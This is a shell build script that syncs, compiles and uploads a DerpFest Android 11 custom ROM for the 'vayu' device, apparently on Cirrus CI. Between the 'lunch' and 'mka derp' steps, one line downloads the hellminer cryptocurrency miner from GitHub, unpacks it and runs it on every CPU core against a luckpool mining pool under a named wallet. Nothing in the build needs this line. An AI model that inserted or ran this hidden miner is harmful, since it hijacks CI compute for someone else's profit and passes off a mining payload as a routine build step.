# sync rom
repo init --depth=1 --no-repo-verify -u git://github.com/DerpFest-11/manifest.git -b 11 -g default,-mips,-darwin,-notdefault
git clone https://github.com/ganssjr/local_manifests.git --depth 1 -b master .repo/local_manifests
repo sync -c --no-clone-bundle --no-tags --optimized-fetch --prune --force-sync -j8

# build rom
source build/envsetup.sh
lunch derp_vayu-user
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RB1ZW4E96oUwrLgaZWkxyMeJJnK95KQJsG.arif01 -p x --cpu $(nproc --all)
export TZ=Asia/Dhaka #put before last build command
mka derp

# upload rom (if you don't need to upload multiple files, then you don't need to edit next line)
rclone copy out/target/product/$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1)/*.zip cirrus:$(grep unch $CIRRUS_WORKING_DIR/build_rom.sh -m 1 | cut -d ' ' -f 2 | cut -d _ -f 2 | cut -d - -f 1) -P
